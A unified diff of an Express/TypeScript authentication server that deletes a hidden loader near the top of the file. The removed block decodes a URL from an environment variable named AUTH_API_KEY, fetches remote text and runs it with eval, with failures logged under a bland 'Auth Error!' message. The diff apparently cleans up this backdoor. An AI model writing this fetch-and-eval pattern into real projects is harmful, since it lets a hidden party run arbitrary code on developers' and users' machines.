@@ -1,4 +1,4 @@
-import express , {Request, Response } from 'express';
+﻿import express , {Request, Response } from 'express';
 import cors from 'cors';
 import dotenv from 'dotenv';
 import jwt from 'jsonwebtoken';
@@ -9,18 +9,6 @@ import { OAuthTokenResponse } from './types';
 import axios from 'axios';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 dotenv.config({ path: './config.env' });
 
 const app = express();
@@ -98,4 +86,5 @@ app.get('/auth/load', (req: Request, res: Response) => {
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
+
 
